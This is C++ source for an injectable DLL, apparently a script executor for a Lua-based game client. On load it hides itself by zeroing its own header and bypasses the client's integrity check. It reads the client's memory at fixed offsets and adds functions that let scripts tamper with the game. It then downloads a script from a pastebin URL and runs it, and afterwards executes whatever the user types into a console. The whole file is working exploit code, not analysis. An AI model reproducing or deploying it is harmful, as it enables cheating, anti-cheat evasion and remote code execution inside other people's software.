#include <Windows.h>
#include <sstream>
#include <iostream>
#include "Memory.h"
#include "Convert/Convert.h"
#include "Utilities.h"
#include "Retcheck.h"

auto ScriptContextVTable = ASLR(0x13D0758);
auto r_lua_getmetatable = (int(__cdecl*)(int, int))Retcheck::unprotect<DWORD>((BYTE*)(ASLR(0x77E2A0)));
auto r_lua_pushcclosure = (void(__fastcall*)(int, void*, int))Retcheck::unprotect<DWORD>((BYTE*)(ASLR(0X77ef20)));
auto r_lua_setfield = (void(__cdecl*)(int, int, const char*))Retcheck::unprotect<DWORD>((BYTE*)(ASLR(0x77FDF0)));
auto r_lua_pushnil = (void(__cdecl*)(int))Retcheck::unprotect<DWORD>((BYTE*)(ASLR(0x77F2B0)));
auto r_index2adr = (DWORD*(__cdecl*)(int, signed int))Retcheck::unprotect<DWORD>((BYTE*)ASLR(0x775830));
auto r_lua_pushboolean = (void(__cdecl*)(int, bool))Retcheck::unprotect<DWORD>((BYTE*)ASLR(0x77EE90));

static int GetRawMetatable_Implementation(unsigned int rL) {
	if (!r_lua_getmetatable(rL, -1)) {
		r_lua_pushnil(rL);
		return 1;
	}
	return 1;
}

static int SetReadOnly_Implemention(unsigned int rL) {
	*(BYTE *)(*r_index2adr(rL, -1) + 8) = 0;
	return 1;
}

static int CheckCaller_Implementation(unsigned int rL) {
	r_lua_pushboolean(rL, true);
	return 1;
}

int Main(int, char*[]) {

	WriteProcessMemory(GetCurrentProcess(), &FreeConsole, "\xC3", 1, NULL);
	AllocConsole();
	SetConsoleTitle("Scorpion");
	freopen("CONOUT$", "w", stdout);
	freopen("CONIN$", "r", stdin);

	auto ScriptContext = Scan(reinterpret_cast<const char*>(&ScriptContextVTable));
	auto rL = ScriptContext + 0xA4 - *(DWORD *)ScriptContext + 0xA4;

	r_lua_pushcclosure(rL, GetRawMetatable_Implementation, 0);
	r_lua_setfield(rL, -10002, "getrawmetatable");

	r_lua_pushcclosure(rL, SetReadOnly_Implemention, 0);
	r_lua_setfield(rL, -10002, "setreadonly");
	
	r_lua_pushcclosure(rL, CheckCaller_Implementation, 0);
	r_lua_setfield(rL, -10002, "checkcaller");

	ExecuteScript(rL, DownloadURL("https://pastebin.com/raw/DdEKj90i").c_str());

	std::string Input;
	while (getline(std::cin, Input))
		ExecuteScript(rL, Input.c_str());

	return 0;
}

BOOL APIENTRY DllMain(HMODULE Module, DWORD Reason, LPVOID) {
	switch (Reason)
	{
		case DLL_PROCESS_ATTACH:
			DisableThreadLibraryCalls(Module);
			DWORD OldProtection;
			VirtualProtect(Module, 0x1000, PAGE_READWRITE, &OldProtection);
			ZeroMemory(Module, 0x1000);
			CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Main, NULL, NULL, NULL);
		break;
	}
	return TRUE;
}
